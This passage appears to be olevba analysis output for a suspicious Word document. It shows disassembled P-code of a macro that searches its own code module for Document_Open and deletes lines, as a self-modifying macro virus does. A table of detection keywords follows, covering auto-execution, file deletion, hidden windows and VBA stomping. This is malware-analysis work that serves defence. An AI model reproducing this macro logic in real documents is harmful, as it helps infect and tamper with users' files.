' 	LitVarSpecial (False)
' 	St flagio 
' Line #216:
' 	Ld count 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	Ld bry 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	ArgsLd Trim 0x0001 
' 	LitStr 0x0018 "Dim flagaltro As Boolean"
' 	Eq 
' 	IfBlock 
' Line #217:
' 	LitVarSpecial (True)
' 	St flagio 
' Line #218:
' 	LitVarSpecial (False)
' 	St flagaltro 
' Line #219:
' 	ExitFor 
' Line #220:
' 	EndIfBlock 
' Line #221:
' 	EndIfBlock 
' Line #222:
' 	StartForVariable 
' 	Ld count 
' 	EndForVariable 
' 	NextVar 
' Line #223:
' Line #224:
' 	Ld flagaltro 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #225:
' 	StartForVariable 
' 	Ld count 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld bry 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #226:
' 	Ld count 
' 	LitDI2 0x0001 
' 	Ld bry 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x001B "Private Sub Document_Open()"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitFor 
' 	EndIf 
' Line #227:
' 	StartForVariable 
' 	Ld count 
' 	EndForVariable 
' 	NextVar 
' Line #228:
' Line #229:
' 	Ld count 
' 	LitDI2 0x0001 
' 	Ld bry 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0007 "End Sub"
' 	Eq 
' 	DoUnitil 
' Line #230:
' 	Ld count 
' 	Paren 
' 	Ld bry 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #231:
' 	Loop 
' Line #232:
' Line #233:
' 	Ld count 
' 	Paren 
' 	Ld bry 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #234:
' Line #235:
' 	LitVarSpecial (False)
' 	St flagaltro 
' Line #236:
' 	EndIfBlock 
' Line #237:
' Line #238:
' 	OnError (GoTo 0) 
' Line #239:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|ShowWindow          |May hide the application                     |
|Suspicious|SW_HIDE             |May hide the application                     |
|Suspicious|FindWindow          |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |User32.dll          |Executable file name                         |
|IOC       |MSWord.Class        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

